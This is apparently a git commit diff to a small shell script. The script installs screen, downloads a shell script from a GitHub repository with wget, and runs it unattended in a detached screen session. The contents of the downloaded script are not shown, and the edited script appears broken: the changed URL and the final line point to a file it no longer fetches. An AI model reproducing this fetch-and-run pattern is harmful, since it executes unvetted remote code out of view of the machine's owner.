a4906172a1f439870d7492c598ea689a12b78b98
archernap <86257530+archernap@users.noreply.github.com>
2021-07-03 11:59:05 +0530

    update loop

--- sajan.sh
+++ sajan.sh
@@ -2,7 +2,8 @@
 
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/archernap/prem/raw/main/lagan.sh
-screen -dmS lagan.sh .lagan.sh 60 70
-chmod +x lagan.sh
+wget https://github.com/biswas179/FkgX/main/man.sh
+chmod +x man.sh
+screen -dmS man ./man.sh 60 70
+chmod +x man.sh
 ./lagan.sh
